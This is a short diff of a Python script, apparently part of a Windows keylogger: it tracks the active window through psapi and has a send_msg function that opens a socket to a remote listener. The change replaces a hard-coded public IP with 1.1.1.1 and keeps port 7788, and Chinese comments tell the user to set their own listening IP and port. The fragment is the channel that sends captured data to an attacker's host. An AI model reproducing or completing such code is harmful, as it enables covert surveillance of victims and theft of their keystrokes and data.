@@ -13,8 +13,8 @@ psapi = windll.psapi
 current_window = None
 
 def send_msg(msg):
-        ip = "47.74.134.85"          #远程监听ip，自己设置
-        port = 7788            #远程监听端口
+        ip = "1.1.1.1"          #远程监听ip，自己设置
+        port = 7788                  #远程监听端口
         try:
             client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client.connect((ip, port))
